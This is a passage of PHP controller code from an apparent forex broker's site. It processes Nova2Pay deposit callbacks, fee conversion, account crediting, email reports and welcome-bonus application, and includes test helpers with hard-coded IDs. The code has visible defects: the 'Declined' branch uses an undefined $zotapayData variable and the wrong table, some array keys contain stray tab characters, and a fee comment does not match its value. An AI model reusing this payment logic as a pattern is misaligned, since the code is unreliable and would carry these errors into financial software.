                        $updateData = ['status' => 1]; // update the status table
                        $this->general_model->updatemy('nova2pay', 'order_id', $nova2payData['merOrderId'], $updateData);

                        $accData = $this->general_model->whereConditionQuery($invData['user_id']);

                      
                        //wallet currency to base currency USD
                           $fixedFee = 0.3; //USD
                           $depositFee = 0.06; //3%
                           
                           $amountUSD = FXPP::roundno($this->get_convert_amount($nova2payData['currency'], $paidAmount,'USD'), 2); //amount in EUR
                           $totalFeeUSD = ($amountUSD * $depositFee) + $fixedFee;

                          $totalFee = FXPP::roundno($this->get_convert_amount('USD', $totalFeeUSD, $accData['currency']), 2); //amount in account currency
                          $amount = FXPP::roundno($this->get_convert_amount('USD', $amountUSD, $accData['currency']), 2); //amount in account currency

                        $isMicro = $this->account_model->isMicro($invData['user_id']);
                        if ($isMicro) {
                            $amount *= 100;
                            $totalFee *= 100;
                        }

                        $amount -= $totalFee;
                        $conv_amount = $amount;
                        $conv_amount_fee = $totalFee;
                        $conv_amount_usd = $this->get_convert_amount($accData['currency'], $amount);
                        $conv_amount_fee_usd = $this->get_convert_amount($accData['currency'], $totalFee);

                        $insertDepositFailed = [
                        'transaction_id	' => $nova2payData['merOrderId'],
                        'status	' => 0,
                        'amount	' => $amount,
                        'currency' => $nova2payData['currency'],
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => $paymentType,
                        'fee' => $totalFee,
                        'isFailed' => 0,
                        'type' => 'deposit-'.$isMicro.'-'.$invData['bonus'],
                    ];

                        $data = [
                        'transaction_id' => $nova2payData['merTradeId'],
                        'reference_id' => $nova2payData['merOrderId'],
                        'status' => 2,
                        'amount' => $amount,
                        'currency' => $nova2payData['currency'],
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime('now')),
                        'note' => 'Nova2Pay deposit',
                        'transaction_type' => $paymentType,
                        'conv_amount' => $conv_amount,
                    ];

                        if ($totalFee > 0) {
                            $data_fee = [
                            'transaction_id' => $nova2payData['merTradeId'],
                            'reference_id' => $nova2payData['merOrderId'],
                            'status' => 2,
                            'amount' => $totalFee,
                            'currency' => $nova2payData['currency'],
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime('now')),
                            'note' => 'Nova2Pay deposit',
                            'transaction_type' => $paymentType,
                            'conv_amount' => $conv_amount_fee,
                        ];
                        }

                        $config = [
                        'server' => 'live_new',
                    ];


                        $account_number = $accData['account_number'];

                  
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type[$paymentType].$data['transaction_id']);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
                       

                        if ($requestResult === 'RET_OK') {
                            $data['mt_ticket'] = $ticket;

                            
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }

                        if ($totalFee > 0) {
                        
                            $account_number = $accData['account_number'];

                            $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type[$paymentType].$data['transaction_id']);
                            $requestResult = $WebServiceNew['requestResult'];
                            $ticket = $WebServiceNew['ticket'];
                        

                            if ($requestResult === 'RET_OK') {
                                $data_fee['mt_ticket'] = $ticket;


                            } else {
                                $insertDepositFailed['comment'] = $requestResult;
                                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                            }
                        }

                        $this->SetAccountAgentPotentialFund($account_number);

                        $deposit_id = $this->deposit_model->insertPayment($data);
                        if ($totalFee > 0) {
                            $this->deposit_model->insertPayment($data_fee);
                        }

                        $updateData = ['status' => 1, 'tnx_id' => $nova2payData['merTradeId']];
                        $this->general_model->updatemy('nova2pay', 'order_id', $nova2payData['merOrderId'], $updateData);

                        /**  Use original amount for Cent accounts**/
                        $isMicro = $this->account_model->isMicro($invData['user_id']);
                        $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd);
                        if ($isMicro) {
                            $processed_amount /= 100;
                        }
                        /* End **/
                        /* Send successful email deposit to auto-reports **/
                      

                        $this->sendEmailAfterSuccessDeposit($paymentType, $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type[$paymentType].$data['transaction_id']);
                        /* End **/


                        /* if (IPLoc::APIUpgradeDevIP()) {
                             FXPP::updateAccountTradingStatusV2($account_number, $invData['user_id']); // for pro accounts
                         } else {*/
                        FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                        //}

                        /* ========================================== Welcome bonus================================================ **/



                        self::applyDepositBonus($invData['user_id'], $account_number, $amount, $paymentType, $invData['bonus'], $data['transaction_id'], false);

                        if ($invData['additional_tenp_bonus'] == 1) {
                            self::applyDepositBonus($invData['user_id'], $account_number, $amount, $paymentType, 'tenpb', $data['transaction_id'], true);
                        }

                        /**=========================================== Welcome bonus end ====================================================**/



                    } else {
                        $updateData = ['status' => 2, 'tnx_id' => $nova2payData['merTradeId'], 'note' => 'tf do not match.'];
                        $this->general_model->updatemy('nova2pay', 'order_id', $nova2payData['merOrderId'], $updateData);
                    }
            
            } elseif ($status == 'Declined') {
                $updateData = ['status' => 2, 'tnx_id' => $nova2payData['merTradeId'], 'note' => 'status - '.$status];
                $this->general_model->updatemy('zotapay', 'order_id', $zotapayData['merOrderId'], $updateData);
    
            } else { 
                // declined
                $updateData = ['status' => 2, 'tnx_id' => $nova2payData['merTradeId'], 'note' => 'status - '.$status];
                $this->general_model->updatemy('nova2pay', 'order_id', $nova2payData['merOrderId'], $updateData);
            }
        }
      
    }
    
   
    


    public function testSend(){
        $reportPayment = "TEST";
        $processed_amount = 3;
        $account_number = 212690;
        $transaction_id = '123456789';
        $userId = 135835;
        $this->sendEmailAfterSuccessDepositTest($reportPayment, $processed_amount, $account_number, $userId, $this->comment_type['deposit'].$this->comment_transaction_type['ZOTAPAY'].$transaction_id);
        

    }


    public function validateAdditionalBonus($addBonus)
    {
        $additionalTenPercentBonus = 0;
        if (IPLoc::frzPM() || IPLoc::VPN_IP_Jenalie() || IPLoc::Office()) {
            $additionalTenPercentBonus = $addBonus;
        }

        return $additionalTenPercentBonus;
    }

    public function testDepositBonus()
    {
        if (IPLoc::frz()) {
            echo '<pre>';
            echo '----------->';
            echo '<br>';
            
            
            
            
            FXPP::DepositBonusProcessNew_frz_test('58082274', '1000', '407418', "",  'twpb', '103510');
            
            exit;

            // FXPP::DepositBonus('395575', '58072464', '39776.9', 'BITCOIN', 'twpb', 'CRY202102090138098');

            $depositBonusValidation = FXPP::DepositBonusValidation('395575', 'twpb');

            //print_r($depositBonusValidation);   exit;

            //$depositBonusProcess = self::DepositBonusProcess('58072464', '39776.9', '395575', 'BITCOIN', 'twpb', 'CRY202102090138098');

            $depositBonusProcess = FXPP::DepositBonusProcess_test('58072464', '39776.9', '395575', 'BITCOIN', 'twpb', 'CRY202102090138098');

            print_r($depositBonusProcess);
            exit;

            // FXPP::deposit_bonus_validation_log($user_id,$account_number,$module,$bonus,$depositId,$amountDeposited,$error_data)
          //  FXPP::deposit_bonus_validation_log(123,234,234,2342,2342,23423,23423);
        }
    }

    public function applyDepositBonus($user_id, $account_number, $total_amount, $payment_option, $bonus, $trx_id, $add_bonus = false){

//        if(IPLoc::APIUpgradeDevIP() || IPLoc::frzPM() || IPLoc::Office()){ //new implementation using new API

            $nonHundredBonuses = array(
                'twpb', // FOREXMART WELCOME BONUS 20%
                'tpb',  // FOREXMART WELCOME BONUS 30%
                'fpb'   // FOREXMART WELCOME BONUS 50%
            );

            if(in_array($bonus, $nonHundredBonuses)){

                FXPP::DepositBonusNew($user_id, $account_number, $total_amount, $payment_option, $bonus, $trx_id);

            }else{

                if ($bonus == 'hpb') { // FOREXMART limited 100%  BONUS
                    FXPP::Deposit100PercentBonusNew($user_id, $account_number, $total_amount, 'hplb', $bonus, $trx_id);
                }

                if (IPLoc::Office()) {
                    if ($bonus == 'rhpb') { // FOREXMART regular 100%  BONUS
                        FXPP::DepositRegular100PercentBonusNew($user_id, $account_number, $total_amount, $payment_option, $bonus, $trx_id);
                    }
                }

            }

            if($add_bonus){ //FOREXMART WELCOME BONUS 10% (additional to 20% bonus)
                FXPP::DepositBonusNew($user_id, $account_number, $total_amount, $payment_option, $bonus, $trx_id);
            }

//        }else{ //old implementation of bonuses
//
//            if ($bonus == 'twpb') {
//                // FOREXMART WELCOME BONUS 20%
//                FXPP::DepositBonus($user_id, $account_number, $total_amount, $payment_option, $bonus, $trx_id);
//            }
//
//            if ($bonus == 'tpb') {
//                // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                FXPP::DepositBonus($user_id, $account_number, $total_amount, $payment_option, $bonus, $trx_id);
//            }
//            if ($bonus == 'fpb') {
//                // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                FXPP::DepositBonus($user_id, $account_number, $total_amount, $payment_option, $bonus, $trx_id);
//            }
//
//            if ($bonus == 'hpb') {
//                // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                FXPP::Deposit100PercentBonus($user_id, $account_number, $total_amount, $payment_option, 'hplb', $trx_id);
//            }
//
//            if (IPLoc::Office()) {
//                if ($bonus == 'rhpb') {
//                    FXPP::DepositRegular100PercentBonus($user_id, $account_number, $total_amount, $payment_option, $bonus, $trx_id);
//                }
//            }
//
//        }

    }
}
